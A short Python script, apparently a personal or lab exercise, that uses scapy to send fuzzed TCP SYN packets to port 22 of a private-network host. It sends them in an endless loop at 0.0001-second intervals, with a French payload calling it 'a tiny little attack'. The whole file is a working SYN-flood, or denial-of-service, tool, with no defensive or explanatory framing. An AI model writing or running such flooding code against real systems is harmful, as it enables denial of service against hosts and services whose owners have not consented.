#!/usr/bin/env python
import os
import time
from scapy.all import *

SRC = '192.168.0.53'
DST = '192.168.0.218'
PSRC = 22
PDST = 22
load = "Ceci est une toute petite attaque, no worries"

# Ether() / IP() / TCP()
packet = IP(src=SRC, dst=DST) / fuzz(TCP(sport=PSRC, dport=PDST, flags="S")) / load

packet.show2()
send(packet,loop=1,inter=0.0001)

#send(IP(dst="192.168.0.218")/ICMP())
#while 1 == 1:
#	send(packet)
